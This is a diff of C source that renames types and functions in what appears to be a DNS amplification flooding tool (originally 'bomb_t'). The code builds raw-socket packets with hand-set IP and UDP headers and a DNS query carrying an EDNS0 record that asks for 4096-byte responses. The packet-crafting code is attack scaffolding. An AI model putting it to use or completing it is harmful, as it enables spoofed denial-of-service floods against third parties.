@@ -68,23 +68,23 @@ typedef struct {
     DNS_header *dns;
     DNS_query *query;
     DNS_opt *opt;
-} bomb_t;
+} Trash;
 
 /* Functions */
-bomb_t *Create_Rawsock(bomb_t *);
-bomb_t *stfu_kernel(bomb_t *);
+Trash *Create_Rawsock(Trash *);
+Trash *stfu_kernel(Trash *);
 unsigned short Checksum(unsigned short *, int);
-bomb_t *build_ip_header(bomb_t *);
-bomb_t *build_udp_header(bomb_t *);
-bomb_t *build_dns_request(bomb_t *);
+Trash *Build_IP_Header(Trash *);
+Trash *Build_UDP_Header(Trash *);
+Trash *DNS_Request(Trash *);
 void dns_name_format(char *, char *);
-bomb_t *build_packet(bomb_t *,  int);
-bomb_t *Fill_sock(bomb_t *);
+Trash *build_packet(Trash *,  int);
+Trash *Fill_sock(Trash *);
 void Implement(int);
 
 
 /* create raw socket */
-bomb_t *Create_Rawsock(bomb_t *a)
+Trash *Create_Rawsock(Trash *a)
 {
     a->sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
 
@@ -93,7 +93,7 @@ bomb_t *Create_Rawsock(bomb_t *a)
 
 
 /* say STFU to kernel - we set our own headers */
-bomb_t *stfu_kernel(bomb_t *a)
+Trash *stfu_kernel(Trash *a)
 {
     a->one = 1;
 
@@ -125,7 +125,7 @@ unsigned short Checksum(unsigned short *addr, int len)
 
 
 /* build and fill in ip header */
-bomb_t *build_ip_header(bomb_t *bomb)
+Trash *Build_IP_Header(Trash *bomb)
 {
     bomb->ip = (struct iphdr *) bomb->packet;
 
@@ -147,7 +147,7 @@ bomb_t *build_ip_header(bomb_t *bomb)
 
 
 /* build and fill in udp header */
-bomb_t *build_udp_header(bomb_t *bomb)
+Trash *Build_UDP_Header(Trash *bomb)
 {
     bomb->udp = (struct udphdr *) (bomb->packet + sizeof(struct iphdr));
 
@@ -182,13 +182,11 @@ void dns_name_format(char *qname, char *host)
 
 
 /* build and fill in dns request */
-bomb_t *build_dns_request(bomb_t *bomb)
+Trash *DNS_Request(Trash *bomb)
 {
     char *qname = NULL;
 
-
-    bomb->dns = (DNS_header *) (bomb->packet + sizeof(struct iphdr) + 
-                           sizeof(struct udphdr));
+    bomb->dns = (DNS_header *) (bomb->packet + sizeof(struct iphdr) + sizeof(struct udphdr));
 
     bomb->dns->id = (unsigned short) htons(getpid());
     bomb->dns->qr = 0;
@@ -219,9 +217,7 @@ bomb_t *build_dns_request(bomb_t *bomb)
     bomb->opt = (DNS_opt*)(bomb->packet + sizeof(struct iphdr) + 
                            sizeof(struct udphdr) + sizeof(DNS_header) + (strlen(qname)) + sizeof(DNS_query) + 1);
     bomb->opt->name = 0;
-    /*printf("%d\n",bomb->opt->type);*/
     bomb->opt->type  =htons(41) ;
-    /*printf("%d\n",bomb->opt->type);*/
     bomb->opt->udplength =htons(4096);
     bomb->opt->rcode = 0;
     bomb->opt->ednsversion = 0;
@@ -230,20 +226,19 @@ bomb_t *build_dns_request(bomb_t *bomb)
     return bomb;
 }
 
-bomb_t *build_packet(bomb_t *a, int c)
+Trash *build_packet(Trash *a, int c)
 {   
-    printf("check3\n");
     a->packet = (char *) malloc(4096);
     a->packet = memset(a->packet, 0x00, 4096);
 
-    a = build_ip_header(a);
-    a = build_udp_header(a);
-    a = build_dns_request(a);
+    a = Build_IP_Header(a);
+    a = Build_UDP_Header(a);
+    a = DNS_Request(a);
 
     return a;
 }
 
-bomb_t *Fill_sock(bomb_t *a)
+Trash *Fill_sock(Trash *a)
 {
     a->target.sin_family = AF_INET;
     a->target.sin_port = a->udp->dest;
@@ -254,11 +249,11 @@ bomb_t *Fill_sock(bomb_t *a)
 
 void Implement(int a)
 {
-    bomb_t *b = NULL;
+    Trash *b = NULL;
 
     
-    b = (bomb_t *) malloc(sizeof(bomb_t));
-    b = memset(b, 0, sizeof(bomb_t)); /*0x00*/
+    b = (Trash *) malloc(sizeof(Trash));
+    b = memset(b, 0, sizeof(Trash)); /*0x00*/
 
     b = Create_Rawsock(b);
     b = stfu_kernel(b);
